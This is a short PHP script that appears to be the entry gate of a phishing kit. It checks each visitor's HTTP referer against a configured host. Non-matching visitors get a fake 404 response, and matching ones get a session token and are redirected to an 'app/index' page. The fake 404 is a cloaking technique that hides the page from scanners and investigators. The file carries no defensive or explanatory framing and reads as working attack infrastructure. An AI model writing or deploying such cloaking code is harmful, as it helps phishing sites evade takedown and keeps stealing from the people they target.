<?php
require 'extra/mine.php';	
session_start();
if  (isset($_SERVER['HTTP_REFERER'])){
$ref = $_SERVER['HTTP_REFERER'];
$refData = parse_url($ref);
$_SESSION['refData'] = $refData['host'];
$_SESSION['redirectlink'] = $redirectlink;
if ($_SESSION['refData'] != $redirectlink) {
        exit(header('HTTP/1.0 404 Not Found'));
}else{
	$acsh33nz0key = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
	$_SESSION['acsh33nz0key'] = $acsh33nz0key;
	exit(header("Location: app/index"));
}
}
?>